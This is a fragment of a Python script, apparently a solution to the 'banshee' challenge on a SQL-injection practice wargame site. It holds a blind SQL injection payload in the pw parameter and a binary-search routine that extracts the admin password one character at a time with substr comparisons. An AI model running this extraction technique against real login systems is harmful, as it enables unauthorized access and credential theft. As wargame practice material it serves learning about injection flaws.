...
def is_true(query):
    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?pw=' or id='admin' and {0}-- -".format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<h2>login success!</h2>') > -1:
        return True
    return False
...
def guess_char(location):
    ...
    while True:
        ...
        query = "substr(pw,{0},1)>'{1}'".format(location, chr(mid))
        if is_true(query):
            if top == bottom:
                return chr(mid)
            bottom = mid + 1
